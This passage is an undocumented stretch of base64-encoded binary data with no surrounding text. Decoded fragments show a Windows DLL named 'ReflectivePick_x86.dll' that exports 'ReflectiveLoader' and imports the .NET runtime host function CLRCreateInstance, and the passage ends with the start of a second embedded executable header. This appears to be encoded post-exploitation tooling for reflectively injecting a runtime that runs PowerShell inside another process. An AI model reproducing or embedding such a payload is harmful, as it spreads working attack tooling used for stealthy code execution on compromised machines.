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AAG0AawAAAAAAYQBmAAAAAABrAGEAAAAAAGYAbwAAAAAAaABpAAAAAABtAHMAAAAAAGsAawAAAAAAawB5AAAAAABzAHcAAAAAAHUAegAAAAAAdAB0AAAAAABwAGEAAAAAAGcAdQAAAAAAdABhAAAAAAB0AGUAAAAAAGsAbgAAAAAAbQByAAAAAABzAGEAAAAAAG0AbgAAAAAAZwBsAAAAAABrAG8AawAAAHMAeQByAAAAZABpAHYAAAAAAAAAYQByAC0AUwBBAAAAYgBnAC0AQgBHAAAAYwBhAC0ARQBTAAAAYwBzAC0AQwBaAAAAZABhAC0ARABLAAAAZABlAC0ARABFAAAAZQBsAC0ARwBSAAAAZgBpAC0ARgBJAAAAZgByAC0ARgBSAAAAaABlAC0ASQBMAAAAaAB1AC0ASABVAAAAaQBzAC0ASQBTAAAAaQB0AC0ASQBUAAAAbgBsAC0ATgBMAAAAbgBiAC0ATgBPAAAAcABsAC0AUABMAAAAcAB0AC0AQgBSAAAAcgBvAC0AUgBPAAAAcgB1AC0AUgBVAAAAaAByAC0ASABSAAAAcwBrAC0AUwBLAAAAcwBxAC0AQQBMAAAAcwB2AC0AUwBFAAAAdABoAC0AVABIAAAAdAByAC0AVABSAAAAdQByAC0AUABLAAAAaQBkAC0ASQBEAAAAdQBrAC0AVQBBAAAAYgBlAC0AQgBZAAAAcwBsAC0AUwBJAAAAZQB0AC0ARQBFAAAAbAB2AC0ATABWAAAAbAB0AC0ATABUAAAAZgBhAC0ASQBSAAAAdgBpAC0AVgBOAAAAaAB5AC0AQQBNAAAAYQB6AC0AQQBaAC0ATABhAHQAbgAAAAAAZQB1AC0ARQBTAAAAbQBrAC0ATQBLAAAAdABuAC0AWgBBAAAAeABoAC0AWgBBAAAAegB1AC0AWgBBAAAAYQBmAC0AWgBBAAAAawBhAC0ARwBFAAAAZgBvAC0ARgBPAAAAaABpAC0ASQBOAAAAbQB0AC0ATQBUAAAAcwBlAC0ATgBPAAAAbQBzAC0ATQBZAAAAawBrAC0ASwBaAAAAawB5AC0ASwBHAAAAcwB3AC0ASwBFAAAAdQB6AC0AVQBaAC0ATABhAHQAbgAAAAAAdAB0AC0AUgBVAAAAYgBuAC0ASQBOAAAAcABhAC0ASQBOAAAAZwB1AC0ASQBOAAAAdABhAC0ASQBOAAAAdABlAC0ASQBOAAAAawBuAC0ASQBOAAAAbQBsAC0ASQBOAAAAbQByAC0ASQBOAAAAcwBhAC0ASQBOAAAAbQBuAC0ATQBOAAAAYwB5AC0ARwBCAAAAZwBsAC0ARQBTAAAAawBvAGsALQBJAE4AAAAAAHMAeQByAC0AUwBZAAAAAABkAGkAdgAtAE0AVgAAAAAAcQB1AHoALQBCAE8AAAAAAG4AcwAtAFoAQQAAAG0AaQAtAE4AWgAAAGEAcgAtAEkAUQAAAGQAZQAtAEMASAAAAGUAbgAtAEcAQgAAAGUAcwAtAE0AWAAAAGYAcgAtAEIARQAAAGkAdAAtAEMASAAAAG4AbAAtAEIARQAAAG4AbgAtAE4ATwAAAHAAdAAtAFAAVAAAAHMAcgAtAFMAUAAtAEwAYQB0AG4AAAAAAHMAdgAtAEYASQAAAGEAegAtAEEAWgAtAEMAeQByAGwAAAAAAHMAZQAtAFMARQAAAG0AcwAtAEIATgAAAHUAegAtAFUAWgAtAEMAeQByAGwAAAAAAHEAdQB6AC0ARQBDAAAAAABhAHIALQBFAEcAAAB6AGgALQBIAEsAAABkAGUALQBBAFQAAABlAG4ALQBBAFUAAABlAHMALQBFAFMAAABmAHIALQBDAEEAAABzAHIALQBTAFAALQBDAHkAcgBsAAAAAABzAGUALQBGAEkAAABxAHUAegAtAFAARQAAAAAAYQByAC0ATABZAAAAegBoAC0AUwBHAAAAZABlAC0ATABVAAAAZQBuAC0AQwBBAAAAZQBzAC0ARwBUAAAAZgByAC0AQwBIAAAAaAByAC0AQgBBAAAAcwBtAGoALQBOAE8AAAAAAGEAcgAtAEQAWgAAAHoAaAAtAE0ATwAAAGQAZQAtAEwASQAAAGUAbgAtAE4AWgAAAGUAcwAtAEMAUgAAAGYAcgAtAEwAVQAAAGIAcwAtAEIAQQAtAEwAYQB0AG4AAAAAAHMAbQBqAC0AUwBFAAAAAABhAHIALQBNAEEAAABlAG4ALQBJAEUAAABlAHMALQBQAEEAAABmAHIALQBNAEMAAABzAHIALQBCAEEALQBMAGEAdABuAAAAAABzAG0AYQAtAE4ATwAAAAAAYQByAC0AVABOAAAAZQBuAC0AWgBBAAAAZQBzAC0ARABPAAAAcwByAC0AQgBBAC0AQwB5AHIAbAAAAAAAcwBtAGEALQBTAEUAAAAAAGEAcgAtAE8ATQAAAGUAbgAtAEoATQAAAGUAcwAtAFYARQAAAHMAbQBzAC0ARgBJAAAAAABhAHIALQBZAEUAAABlAG4ALQBDAEIAAABlAHMALQBDAE8AAABzAG0AbgAtAEYASQAAAAAAYQByAC0AUwBZAAAAZQBuAC0AQgBaAAAAZQBzAC0AUABFAAAAYQByAC0ASgBPAAAAZQBuAC0AVABUAAAAZQBzAC0AQQBSAAAAYQByAC0ATABCAAAAZQBuAC0AWgBXAAAAZQBzAC0ARQBDAAAAYQByAC0ASwBXAAAAZQBuAC0AUABIAAAAZQBzAC0AQwBMAAAAYQByAC0AQQBFAAAAZQBzAC0AVQBZAAAAYQByAC0AQgBIAAAAZQBzAC0AUABZAAAAYQByAC0AUQBBAAAAZQBzAC0AQgBPAAAAZQBzAC0AUwBWAAAAZQBzAC0ASABOAAAAZQBzAC0ATgBJAAAAZQBzAC0AUABSAAAAegBoAC0AQwBIAFQAAAAAAHMAcgAAAAAAYQBmAC0AegBhAAAAYQByAC0AYQBlAAAAYQByAC0AYgBoAAAAYQByAC0AZAB6AAAAYQByAC0AZQBnAAAAYQByAC0AaQBxAAAAYQByAC0AagBvAAAAYQByAC0AawB3AAAAYQByAC0AbABiAAAAYQByAC0AbAB5AAAAYQByAC0AbQBhAAAAYQByAC0AbwBtAAAAYQByAC0AcQBhAAAAYQByAC0AcwBhAAAAYQByAC0AcwB5AAAAYQByAC0AdABuAAAAYQByAC0AeQBlAAAAYQB6AC0AYQB6AC0AYwB5AHIAbAAAAAAAYQB6AC0AYQB6AC0AbABhAHQAbgAAAAAAYgBlAC0AYgB5AAAAYgBnAC0AYgBnAAAAYgBuAC0AaQBuAAAAYgBzAC0AYgBhAC0AbABhAHQAbgAAAAAAYwBhAC0AZQBzAAAAYwBzAC0AYwB6AAAAYwB5AC0AZwBiAAAAZABhAC0AZABrAAAAZABlAC0AYQB0AAAAZABlAC0AYwBoAAAAZABlAC0AZABlAAAAZABlAC0AbABpAAAAZABlAC0AbAB1AAAAZABpAHYALQBtAHYAAAAAAGUAbAAtAGcAcgAAAGUAbgAtAGEAdQAAAGUAbgAtAGIAegAAAGUAbgAtAGMAYQAAAGUAbgAtAGMAYgAAAGUAbgAtAGcAYgAAAGUAbgAtAGkAZQAAAGUAbgAtAGoAbQAAAGUAbgAtAG4AegAAAGUAbgAtAHAAaAAAAGUAbgAtAHQAdAAAAGUAbgAtAHUAcwAAAGUAbgAtAHoAYQAAAGUAbgAtAHoAdwAAAGUAcwAtAGEAcgAAAGUAcwAtAGIAbwAAAGUAcwAtAGMAbAAAAGUAcwAtAGMAbwAAAGUAcwAtAGMAcgAAAGUAcwAtAGQAbwAAAGUAcwAtAGUAYwAAAGUAcwAtAGUAcwAAAGUAcwAtAGcAdAAAAGUAcwAtAGgAbgAAAGUAcwAtAG0AeAAAAGUAcwAtAG4AaQAAAGUAcwAtAHAAYQAAAGUAcwAtAHAAZQAAAGUAcwAtAHAAcgAAAGUAcwAtAHAAeQAAAGUAcwAtAHMAdgAAAGUAcwAtAHUAeQAAAGUAcwAtAHYAZQAAAGUAdAAtAGUAZQAAAGUAdQAtAGUAcwAAAGYAYQAtAGkAcgAAAGYAaQAtAGYAaQAAAGYAbwAtAGYAbwAAAGYAcgAtAGIAZQAAAGYAcgAtAGMAYQAAAGYAcgAtAGMAaAAAAGYAcgAtAGYAcgAAAGYAcgAtAGwAdQAAAGYAcgAtAG0AYwAAAGcAbAAtAGUAcwAAAGcAdQAtAGkAbgAAAGgAZQAtAGkAbAAAAGgAaQAtAGkAbgAAAGgAcgAtAGIAYQAAAGgAcgAtAGgAcgAAAGgAdQAtAGgAdQAAAGgAeQAtAGEAbQAAAGkAZAAtAGkAZAAAAGkAcwAtAGkAcwAAAGkAdAAtAGMAaAAAAGkAdAAtAGkAdAAAAGoAYQAtAGoAcAAAAGsAYQAtAGcAZQAAAGsAawAtAGsAegAAAGsAbgAtAGkAbgAAAGsAbwBrAC0AaQBuAAAAAABrAG8ALQBrAHIAAABrAHkALQBrAGcAAABsAHQALQBsAHQAAABsAHYALQBsAHYAAABtAGkALQBuAHoAAABtAGsALQBtAGsAAABtAGwALQBpAG4AAABtAG4ALQBtAG4AAABtAHIALQBpAG4AAABtAHMALQBiAG4AAABtAHMALQBtAHkAAABtAHQALQBtAHQAAABuAGIALQBuAG8AAABuAGwALQBiAGUAAABuAGwALQBuAGwAAABuAG4ALQBuAG8AAABuAHMALQB6AGEAAABwAGEALQBpAG4AAABwAGwALQBwAGwAAABwAHQALQBiAHIAAABwAHQALQBwAHQAAABxAHUAegAtAGIAbwAAAAAAcQB1AHoALQBlAGMAAAAAAHEAdQB6AC0AcABlAAAAAAByAG8ALQByAG8AAAByAHUALQByAHUAAABzAGEALQBpAG4AAABzAGUALQBmAGkAAABzAGUALQBuAG8AAABzAGUALQBzAGUAAABzAGsALQBzAGsAAABzAGwALQBzAGkAAABzAG0AYQAtAG4AbwAAAAAAcwBtAGEALQBzAGUAAAAAAHMAbQBqAC0AbgBvAAAAAABzAG0AagAtAHMAZQAAAAAAcwBtAG4ALQBmAGkAAAAAAHMAbQBzAC0AZgBpAAAAAABzAHEALQBhAGwAAABzAHIALQBiAGEALQBjAHkAcgBsAAAAAABzAHIALQBiAGEALQBsAGEAdABuAAAAAABzAHIALQBzAHAALQBjAHkAcgBsAAAAAABzAHIALQBzAHAALQBsAGEAdABuAAAAAABzAHYALQBmAGkAAABzAHYALQBzAGUAAABzAHcALQBrAGUAAABzAHkAcgAtAHMAeQAAAAAAdABhAC0AaQBuAAAAdABlAC0AaQBuAAAAdABoAC0AdABoAAAAdABuAC0AegBhAAAAdAByAC0AdAByAAAAdAB0AC0AcgB1AAAAdQBrAC0AdQBhAAAAdQByAC0AcABrAAAAdQB6AC0AdQB6AC0AYwB5AHIAbAAAAAAAdQB6AC0AdQB6AC0AbABhAHQAbgAAAAAAdgBpAC0AdgBuAAAAeABoAC0AegBhAAAAegBoAC0AYwBoAHMAAAAAAHoAaAAtAGMAaAB0AAAAAAB6AGgALQBjAG4AAAB6AGgALQBoAGsAAAB6AGgALQBtAG8AAAB6AGgALQBzAGcAAAB6AGgALQB0AHcAAAB6AHUALQB6AGEAAAABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/AEMATwBOAE8AVQBUACQAAABBAAAAFwAAADSzABBlKzAwMAAAADEjU05BTgAAMSNJTkQAAAAxI0lORgAAADEjUU5BTgAAEOoAEEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIARAwQQEQCAAAAAyZARAAAAAAAAAAAP////8AAAAAQAAAABxAARAAAAAAAAAAAAEAAAAsQAEQAEABEAAAAAAAAAAAAAAAAAAAAADwmAEQSEABEAAAAAAAAAAAAgAAAFhAARBkQAEQAEABEAAAAADwmAEQAQAAAAAAAAD/////AAAAAEAAAABIQAEQAAAAAAAAAAAAAAAADJkBEBxAARAAAAAAAAAAAAAAAAAomQEQqEABEAAAAAAAAAAAAQAAALhAARDAQAEQAAAAACiZARAAAAAAAAAAAP////8AAAAAQAAAAKhAARAAAAAAAAAAAAAAAABAmQEQ8EABEAAAAAAAAAAAAgAAAABBARAMQQEQAEABEAAAAABAmQEQAQAAAAAAAAD/////AAAAAEAAAADwQAEQAAAAAAAAAAAdJAAATiQAAGBBAABQgAAAQIEAAKrqAADt6gAACOsAAAAAAAAAAAAAAAAAAAAAAAD/////oOoAECIFkxkBAAAAYEEBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAACIFkxkFAAAAsEEBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAP/////F6gAQAAAAAM3qABABAAAA1eoAEAIAAADd6gAQAwAAAOXqABAAAAAARxsAEAAAAADoQQEQAgAAAPRBARAQQgEQEAAAAPCYARAAAAAA/////wAAAAAMAAAALBsAEAAAAAAMmQEQAAAAAP////8AAAAADAAAAKMrABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAeyMAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAADoKAAQAAAAAP7///8AAAAA1P///wAAAAD+////gCoAEJoqABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAASUUAEP7///8AAAAAVUUAEP7///8AAAAA2P///wAAAAD+////AAAAALlGABD+////AAAAAMhGABD+////AAAAANj///8AAAAA/v///xRIABAYSAAQAAAAAP7///8AAAAA2P///wAAAAD+////4EcAEORHABAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAsFQAEAAAAAB1VAAQf1QAEP7///8AAAAAsP///wAAAAD+////AAAAAGNKABAAAAAAt0kAEMFJABD+////AAAAANj///8AAAAA/v///9dRABDbUQAQAAAAAP7///8AAAAA2P///wAAAAD+////rEgAELVIABBAAAAAAAAAAAAAAAAQSwAQ/////wAAAAD/////AAAAAAAAAAAAAAAAAQAAAAEAAACsQwEQIgWTGQIAAAC8QwEQAQAAAMxDARAAAAAAAAAAAAAAAAABAAAAAAAAAP7///8AAAAA1P///wAAAAD+////klMAEJZTABAAAAAA8kgAEAAAAAA0RAEQAgAAAEBEARAQQgEQAAAAAECZARAAAAAA/////wAAAAAMAAAA10gAEAAAAAD+////AAAAAMT///8AAAAA/v///wAAAABkWwAQAAAAAP7///8AAAAAfP///wAAAAD+////AAAAAEFeABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAw2sAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAAUbQAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAFFuABAAAAAA/v///wAAAADM////AAAAAP7///8AAAAA5W8AEAAAAAAAAAAAr28AEP7///8AAAAA1P///wAAAAD+////AAAAAG9zABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAF3cAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAACSeAAQAAAAAP7///8AAAAA2P///wAAAAD+////SX8AEFx/ABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAXYkAEAAAAAD+////AAAAALz///8AAAAA/v///wAAAADhiwAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAKaSABAAAAAA/v///wAAAADM////AAAAAP7///8AAAAAdpMAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAABelAAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAH2rABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAA96wAEAAAAAD+////AAAAAMj///8AAAAA/v///wAAAADfrgAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAEawABAAAAAA/v///wAAAADY////AAAAAP7///+x5wAQzecAEAAAAADk////AAAAAMj///8AAAAA/v///9/oABDl6AAQAAAAAODpABAAAAAAFEcBEAEAAAAcRwEQAAAAAGCZARAAAAAA/////wAAAAAQAAAAoOkAEAAAAAAAAAAAAAAAAJRBuVUAAAAAfEcBAAEAAAACAAAAAgAAAGhHAQBwRwEAeEcBAEIQAADbFgAAk0cBAKRHAQAAAAEAUmVmbGVjdGl2ZVBpY2tfeDg2LmRsbABSZWZsZWN0aXZlTG9hZGVyAFZvaWRGdW5jAAAAAABJAQAAAAAAAAAAADRJAQAA8QAALEkBAAAAAAAAAAAAVkkBACzxAAAASAEAAAAAAAAAAADgTQEAAPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1E0BAMhNAQC6TQEAqk0BAJZNAQCGTQEAeE0BAGJJAQBuSQEAgEkBAJZJAQCiSQEAskkBAMJJAQDUSQEA5EkBAPBJAQAMSgEAIEoBADhKAQBQSgEAYEoBAG5KAQCESgEAlkoBAKxKAQDCSgEA1EoBAORKAQDySgEACksBABxLAQAySwEATEsBAGJLAQB8SwEAlksBALBLAQDMSwEA6ksBAGhNAQASTAEAGkwBAC5MAQBCTAEATkwBAFxMAQBqTAEAdEwBAIhMAQCUTAEAqkwBALxMAQDGTAEA0kwBAN5MAQDwTAEA/kwBABRNAQAoTQEAOE0BAEpNAQBcTQEAAAAAAAkAAIAIAACAmwEAgBoAAIAWAACAFQAAgBAAAIAPAACABgAAgAIAAIAAAAAAQkkBAAAAAABPTEVBVVQzMi5kbGwAAAAAQ0xSQ3JlYXRlSW5zdGFuY2UAbXNjb3JlZS5kbGwArQRSdGxVbndpbmQAyAFHZXRDb21tYW5kTGluZUEADgJHZXRDdXJyZW50VGhyZWFkSWQAAC8DSGVhcEFsbG9jACEBRW5jb2RlUG9pbnRlcgD+AERlY29kZVBvaW50ZXIAQARSYWlzZUV4Y2VwdGlvbgAAUAJHZXRMYXN0RXJyb3IAADMDSGVhcEZyZWUAAG0DSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudABnA0lzRGVidWdnZXJQcmVzZW50ACUBRW50ZXJDcml0aWNhbFNlY3Rpb24AAKIDTGVhdmVDcml0aWNhbFNlY3Rpb24AAAsFU2V0TGFzdEVycm9yAABRAUV4aXRQcm9jZXNzAGYCR2V0TW9kdWxlSGFuZGxlRXhXAACdAkdldFByb2NBZGRyZXNzAADRA011bHRpQnl0ZVRvV2lkZUNoYXIAzQVXaWRlQ2hhclRvTXVsdGlCeXRlAKICR2V0UHJvY2Vzc0hlYXAAAMACR2V0U3RkSGFuZGxlAAA+AkdldEZpbGVUeXBlAAUBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAL4CR2V0U3RhcnR1cEluZm9XAGICR2V0TW9kdWxlRmlsZU5hbWVBAAAtBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAAoCR2V0Q3VycmVudFByb2Nlc3NJZADWAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lACcCR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAnQFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwCCBVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAQwVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIASANJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AFIFU2xlZXAACQJHZXRDdXJyZW50UHJvY2VzcwBhBVRlcm1pbmF0ZVByb2Nlc3MAAHMFVGxzQWxsb2MAAHUFVGxzR2V0VmFsdWUAdgVUbHNTZXRWYWx1ZQB0BVRsc0ZyZWUAZwJHZXRNb2R1bGVIYW5kbGVXAADhBVdyaXRlRmlsZQBjAkdldE1vZHVsZUZpbGVOYW1lVwAAcgNJc1ZhbGlkQ29kZVBhZ2UApAFHZXRBQ1AAAIYCR2V0T0VNQ1AAALMBR2V0Q1BJbmZvAKcDTG9hZExpYnJhcnlFeFcAADYDSGVhcFJlQWxsb2MA+gNPdXRwdXREZWJ1Z1N0cmluZ1cAAJIBRmx1c2hGaWxlQnVmZmVycwAA3AFHZXRDb25zb2xlQ1AAAO4BR2V0Q29uc29sZU1vZGUAAMUCR2V0U3RyaW5nVHlwZVcAADgDSGVhcFNpemUAAJYDTENNYXBTdHJpbmdXAAB/AENsb3NlSGFuZGxlACIFU2V0U3RkSGFuZGxlAAD9BFNldEZpbGVQb2ludGVyRXgAAOAFV3JpdGVDb25zb2xlVwDCAENyZWF0ZUZpbGVXAAoGbHN0cmxlbkEAALIDTG9jYWxGcmVlAEtFUk5FTDMyLmRsbAAAAAAAAAAAAAAAAAAAAAAAAAAATVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAYbjlQAAAAAAAAAAOAAAiELAQsAADAAAAAGAAAAAAAAjk8AAAAgAAAAYAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACgAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAADhPA